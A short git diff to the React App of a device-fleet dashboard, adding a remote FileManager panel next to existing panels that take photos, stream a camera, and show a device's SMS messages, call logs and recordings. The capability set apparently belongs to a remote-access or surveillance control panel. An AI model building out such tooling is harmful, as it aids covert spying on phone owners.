@@ -7,6 +7,7 @@ import { CallsPanel } from './components/dashboard/CallsPanel';
 import { EventLog } from './components/dashboard/EventLog';
 import { CameraLiveFeed } from './components/dashboard/CameraLiveFeed';
 import { DeviceFleetList } from './components/dashboard/DeviceFleetList';
+import { FileManager } from './components/dashboard/FileManager';
 import { useDashboard } from './hooks/useDashboard';
 import RecordingsManager from './components/RecordingsManager';
 import { useAudioPlayback } from './hooks/useAudioPlayback';
@@ -65,6 +66,7 @@ function App() {
     pendingCommands,
     toasts,
     wsReconnectAt,
+    fileManagerData,
     setSelectedDeviceId,
     sendCommand,
     reconnectNow,
@@ -305,6 +307,17 @@ function App() {
               <CameraLiveFeed frame={cameraFrame} photos={photos} onTakeFront={() => handleCommand('take_photo', { camera: 'front' })} onTakeRear={() => handleCommand('take_photo', { camera: 'rear' })} onStopLive={() => handleCommand('camera_live_stop')} />
               <SMSPanel messages={selectedDevice?.sms || []} />
               <CallsPanel calls={selectedDevice?.calls || []} />
+            </div>
+
+            {/* ── File Manager Row ───────────────────────────────────────────── */}
+            <div className="grid grid-cols-1 gap-5">
+              <FileManager 
+                deviceId={selectedDeviceId}
+                isConnected={isConnected}
+                onCommand={handleCommand}
+                fileManagerData={fileManagerData}
+                pendingCommands={pendingCommands}
+              />
             </div>
 
             {/* ── Bottom row: Event Log ─────────────────────────── */}
